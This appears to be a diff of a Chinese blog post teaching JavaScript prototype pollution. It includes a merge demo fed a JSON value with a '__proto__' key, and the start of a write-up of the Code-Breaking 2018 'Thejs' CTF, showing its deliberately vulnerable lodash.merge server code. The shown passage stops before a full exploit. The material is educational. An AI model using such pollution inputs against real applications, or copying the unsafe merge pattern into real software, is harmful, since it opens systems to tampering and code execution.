-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// o对象直接继承了Object.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">"yo"</span>, <span class="string">"whadup"</span>, <span class="string">"?"</span>];</span><br><span class="line"><span class="comment">// 数组都继承于 Array.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>
-<h3 id="原型链污染原理"><a href="#原型链污染原理" class="headerlink" title="原型链污染原理"></a>原型链污染原理</h3><p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p>
-<p>来看一个简单的例子：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">object1 = &#123;<span class="string">"a"</span>:<span class="number">1</span>, <span class="string">"b"</span>:<span class="number">2</span>&#125;;</span><br><span class="line">object1.__proto__.foo = <span class="string">"Hello World"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(object1.foo);</span><br><span class="line">object2 = &#123;<span class="string">"c"</span>:<span class="number">1</span>, <span class="string">"d"</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(object2.foo);</span><br></pre></td></tr></table></figure>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> o = {<span class="hljs-attr">a</span>: <span class="hljs-number">1</span>};</span><br><span class="line"><span class="hljs-comment">// o&#x5BF9;&#x8C61;&#x76F4;&#x63A5;&#x7EE7;&#x627F;&#x4E86;Object.prototype</span></span><br><span class="line"><span class="hljs-comment">// &#x539F;&#x578B;&#x94FE;&#xFF1A;</span></span><br><span class="line"><span class="hljs-comment">// o ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> a = [<span class="hljs-string">&quot;yo&quot;</span>, <span class="hljs-string">&quot;whadup&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>];</span><br><span class="line"><span class="hljs-comment">// &#x6570;&#x7EC4;&#x90FD;&#x7EE7;&#x627F;&#x4E8E; Array.prototype</span></span><br><span class="line"><span class="hljs-comment">// &#x539F;&#x578B;&#x94FE;&#xFF1A;</span></span><br><span class="line"><span class="hljs-comment">// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>)</span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// &#x51FD;&#x6570;&#x90FD;&#x7EE7;&#x627F;&#x4E8E; Function.prototype</span></span><br><span class="line"><span class="hljs-comment">// &#x539F;&#x578B;&#x94FE;&#xFF1A;</span></span><br><span class="line"><span class="hljs-comment">// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x539F;&#x7406;"><a href="#&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x539F;&#x7406;" class="headerlink" title="&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x539F;&#x7406;"></a>&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x539F;&#x7406;</h3><p>&#x5BF9;&#x4E8E;&#x8BED;&#x53E5;&#xFF1A;<code>object[a][b] = value</code> &#x5982;&#x679C;&#x53EF;&#x4EE5;&#x63A7;&#x5236;a&#x3001;b&#x3001;value&#x7684;&#x503C;&#xFF0C;&#x5C06;a&#x8BBE;&#x7F6E;&#x4E3A;<code>__proto__</code>&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x7ED9;object&#x5BF9;&#x8C61;&#x7684;&#x539F;&#x578B;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;b&#x5C5E;&#x6027;&#xFF0C;&#x503C;&#x4E3A;value&#x3002;&#x8FD9;&#x6837;&#x6240;&#x6709;&#x7EE7;&#x627F;object&#x5BF9;&#x8C61;&#x539F;&#x578B;&#x7684;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x5728;&#x672C;&#x8EAB;&#x4E0D;&#x62E5;&#x6709;b&#x5C5E;&#x6027;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x90FD;&#x4F1A;&#x62E5;&#x6709;b&#x5C5E;&#x6027;&#xFF0C;&#x4E14;&#x503C;&#x4E3A;value&#x3002;</p>
+<p>&#x6765;&#x770B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF1A;</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">object1 = {<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-number">2</span>};</span><br><span class="line">object1.__proto__.foo = <span class="hljs-string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="hljs-built_in">console</span>.log(object1.foo);</span><br><span class="line">object2 = {<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-number">2</span>};</span><br><span class="line"><span class="hljs-built_in">console</span>.log(object2.foo);</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://i.loli.net/2020/02/11/kNacVQXFslGYrWt.png" alt="proto_example.png"></p>
-<p>最终会输出两个Hello World。为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p>
-<h3 id="merge操作导致原型链污染"><a href="#merge操作导致原型链污染" class="headerlink" title="merge操作导致原型链污染"></a>merge操作导致原型链污染</h3><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击。</p>
+<p>&#x6700;&#x7EC8;&#x4F1A;&#x8F93;&#x51FA;&#x4E24;&#x4E2A;Hello World&#x3002;&#x4E3A;&#x4EC0;&#x4E48;object2&#x5728;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;foo&#x5C5E;&#x6027;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E5F;&#x4F1A;&#x8F93;&#x51FA;Hello World&#x5462;&#xFF1F;&#x5C31;&#x662F;&#x56E0;&#x4E3A;&#x5728;&#x7B2C;&#x4E8C;&#x6761;&#x8BED;&#x53E5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5BF9;object1&#x7684;&#x539F;&#x578B;&#x5BF9;&#x8C61;&#x8BBE;&#x7F6E;&#x4E86;&#x4E00;&#x4E2A;foo&#x5C5E;&#x6027;&#xFF0C;&#x800C;object2&#x548C;object1&#x4E00;&#x6837;&#xFF0C;&#x90FD;&#x662F;&#x7EE7;&#x627F;&#x4E86;Object.prototype&#x3002;&#x5728;&#x83B7;&#x53D6;object2.foo&#x65F6;&#xFF0C;&#x7531;&#x4E8E;object2&#x672C;&#x8EAB;&#x4E0D;&#x5B58;&#x5728;foo&#x5C5E;&#x6027;&#xFF0C;&#x5C31;&#x4F1A;&#x5F80;&#x7236;&#x7C7B;Object.prototype&#x4E2D;&#x53BB;&#x5BFB;&#x627E;&#x3002;&#x8FD9;&#x5C31;&#x9020;&#x6210;&#x4E86;&#x4E00;&#x4E2A;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#xFF0C;&#x6240;&#x4EE5;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#x5982;&#x679C;&#x80FD;&#x591F;&#x63A7;&#x5236;&#x5E76;&#x4FEE;&#x6539;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x7684;&#x539F;&#x578B;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5F71;&#x54CD;&#x5230;&#x6240;&#x6709;&#x548C;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x540C;&#x4E00;&#x4E2A;&#x539F;&#x578B;&#x7684;&#x5BF9;&#x8C61;&#x3002;</p>
+<h3 id="merge&#x64CD;&#x4F5C;&#x5BFC;&#x81F4;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;"><a href="#merge&#x64CD;&#x4F5C;&#x5BFC;&#x81F4;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;" class="headerlink" title="merge&#x64CD;&#x4F5C;&#x5BFC;&#x81F4;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;"></a>merge&#x64CD;&#x4F5C;&#x5BFC;&#x81F4;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;</h3><p>merge&#x64CD;&#x4F5C;&#x662F;&#x6700;&#x5E38;&#x89C1;&#x53EF;&#x80FD;&#x63A7;&#x5236;&#x952E;&#x540D;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x4E5F;&#x6700;&#x80FD;&#x88AB;&#x539F;&#x578B;&#x94FE;&#x653B;&#x51FB;&#x3002;</p>
 <ul>
-<li>简单例子：</li>
+<li>&#x7B80;&#x5355;&#x4F8B;&#x5B50;&#xFF1A;</li>
 </ul>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> object2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(object1, object2)</span><br><span class="line"><span class="built_in">console</span>.log(object1.a, object1.b)</span><br><span class="line"></span><br><span class="line">object3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(object3.b)</span><br></pre></td></tr></table></figure>
-<p>需要注意的点是：</p>
-<p>在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</p>
-<p>最终输出的结果为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
-<p>可见object3的b是从原型中获取到的，说明Object已经被污染了。</p>
-<h3 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h3><p>这个题目已经有很多的分析文章了，但因为它是一个比较好的学习原型链污染的题目，还是值得自己再过一遍。</p>
-<p>题目源码下载：<a href="http://code-breaking.com/puzzle/9/" target="_blank" rel="noopener">http://code-breaking.com/puzzle/9/</a></p>
-<p>直接npm install可以把需要的模块下载下来。</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span>(<span class="hljs-params">target, source</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) {</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> object1 = {}</span><br><span class="line"><span class="hljs-keyword">let</span> object2 = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-string">&apos;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&apos;</span>)</span><br><span class="line">merge(object1, object2)</span><br><span class="line"><span class="hljs-built_in">console</span>.log(object1.a, object1.b)</span><br><span class="line"></span><br><span class="line">object3 = {}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(object3.b)</span><br></pre></td></tr></table></figure>
+
+<p>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x70B9;&#x662F;&#xFF1A;</p>
+<p>&#x5728;JSON&#x89E3;&#x6790;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;<code>__proto__</code>&#x4F1A;&#x88AB;&#x8BA4;&#x4E3A;&#x662F;&#x4E00;&#x4E2A;&#x771F;&#x6B63;&#x7684;&#x201C;&#x952E;&#x540D;&#x201D;&#xFF0C;&#x800C;&#x4E0D;&#x4EE3;&#x8868;&#x201C;&#x539F;&#x578B;&#x201D;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x904D;&#x5386;object2&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5B58;&#x5728;&#x8FD9;&#x4E2A;&#x952E;&#x3002;</p>
+<p>&#x6700;&#x7EC8;&#x8F93;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x4E3A;&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>&#x53EF;&#x89C1;object3&#x7684;b&#x662F;&#x4ECE;&#x539F;&#x578B;&#x4E2D;&#x83B7;&#x53D6;&#x5230;&#x7684;&#xFF0C;&#x8BF4;&#x660E;Object&#x5DF2;&#x7ECF;&#x88AB;&#x6C61;&#x67D3;&#x4E86;&#x3002;</p>
+<h3 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h3><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x5DF2;&#x7ECF;&#x6709;&#x5F88;&#x591A;&#x7684;&#x5206;&#x6790;&#x6587;&#x7AE0;&#x4E86;&#xFF0C;&#x4F46;&#x56E0;&#x4E3A;&#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x5B66;&#x4E60;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x8FD8;&#x662F;&#x503C;&#x5F97;&#x81EA;&#x5DF1;&#x518D;&#x8FC7;&#x4E00;&#x904D;&#x3002;</p>
+<p>&#x9898;&#x76EE;&#x6E90;&#x7801;&#x4E0B;&#x8F7D;&#xFF1A;<a href="http://code-breaking.com/puzzle/9/" target="_blank" rel="noopener">http://code-breaking.com/puzzle/9/</a></p>
+<p>&#x76F4;&#x63A5;npm install&#x53EF;&#x4EE5;&#x628A;&#x9700;&#x8981;&#x7684;&#x6A21;&#x5757;&#x4E0B;&#x8F7D;&#x4E0B;&#x6765;&#x3002;</p>
 <p>server.js</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">'thejs.session'</span>,</span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>)</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 定义session</span></span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取post数据并合并</span></span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">        <span class="comment">// 再将data赋值给session</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">'Example app listening on port 3000!'</span>))</span><br></pre></td></tr></table></figure>
-<p>问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</p>
-<p>页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中。</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;fs&apos;</span>)</span><br><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;express&apos;</span>)</span><br><span class="line"><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;body-parser&apos;</span>)</span><br><span class="line"><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;lodash&apos;</span>)</span><br><span class="line"><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;express-session&apos;</span>)</span><br><span class="line"><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;randomatic&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded({<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>})).use(bodyParser.json())</span><br><span class="line">app.use(<span class="hljs-string">&apos;/static&apos;</span>, express.static(<span class="hljs-string">&apos;static&apos;</span>))</span><br><span class="line">app.use(session({</span><br><span class="line">    name: <span class="hljs-string">&apos;thejs.session&apos;</span>,</span><br><span class="line">    secret: randomize(<span class="hljs-string">&apos;aA0&apos;</span>, <span class="hljs-number">16</span>),</span><br><span class="line">    resave: <span class="hljs-literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="hljs-literal">false</span></span><br><span class="line">}))</span><br><span class="line"></span><br><span class="line">app.engine(<span class="hljs-string">&apos;ejs&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>{ <span class="hljs-comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err))</span><br><span class="line">        <span class="hljs-keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="hljs-keyword">let</span> rendered = compiled({...options})</span><br><span class="line">        <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered)</span><br><span class="line">    })</span><br><span class="line">})</span><br><span class="line">app.set(<span class="hljs-string">&apos;views&apos;</span>, <span class="hljs-string">&apos;./views&apos;</span>)</span><br><span class="line">app.set(<span class="hljs-string">&apos;view engine&apos;</span>, <span class="hljs-string">&apos;ejs&apos;</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="hljs-string">&apos;/&apos;</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-comment">// &#x5B9A;&#x4E49;session</span></span><br><span class="line">    <span class="hljs-keyword">let</span> data = req.session.data || {<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []}</span><br><span class="line">    <span class="hljs-keyword">if</span> (req.method == <span class="hljs-string">&apos;POST&apos;</span>) {</span><br><span class="line">        <span class="hljs-comment">// &#x83B7;&#x53D6;post&#x6570;&#x636E;&#x5E76;&#x5408;&#x5E76;</span></span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">        <span class="hljs-comment">// &#x518D;&#x5C06;data&#x8D4B;&#x503C;&#x7ED9;session</span></span><br><span class="line">    }</span><br><span class="line">    res.render(<span class="hljs-string">&apos;index&apos;</span>, {</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    })</span><br><span class="line">})</span><br><span class="line"></span><br><span class="line">app.listen(<span class="hljs-number">3000</span>, () =&gt; <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;Example app listening on port 3000!&apos;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>&#x95EE;&#x9898;&#x51FA;&#x5728;&#x4E86;lodashs.merge&#x51FD;&#x6570;&#x8FD9;&#x91CC;&#xFF0C;&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5B58;&#x5728;&#x539F;&#x578B;&#x94FE;&#x6C61;&#x67D3;&#x6F0F;&#x6D1E;&#x3002;&#x4F46;&#x662F;&#x5149;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x8FD8;&#x4E0D;&#x884C;&#xFF0C;&#x6211;&#x4EEC;&#x5F97;&#x5BFB;&#x627E;&#x5230;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x7684;&#x70B9;&#x3002;&#x56E0;&#x4E3A;&#x901A;&#x8FC7;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x67D0;&#x4E00;&#x79CD;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x539F;&#x578B;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x53BB;&#x5BFB;&#x627E;&#x4E00;&#x4E2A;&#x53EF;&#x4EE5;&#x88AB;&#x5229;&#x7528;&#x7684;&#x5C5E;&#x6027;&#x3002;</p>
+<p>&#x9875;&#x9762;&#x6700;&#x7EC8;&#x4F1A;&#x901A;&#x8FC7;lodash.template&#x8FDB;&#x884C;&#x6E32;&#x67D3;&#xFF0C;&#x8DDF;&#x8E2A;&#x5230;lodash/template.js&#x4E2D;&#x3002;</p>
 <p><img src="https://i.loli.net/2020/02/11/QyN5JVOde3YL8aZ.png" alt="template_js.png"></p>
-<p>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。</p>
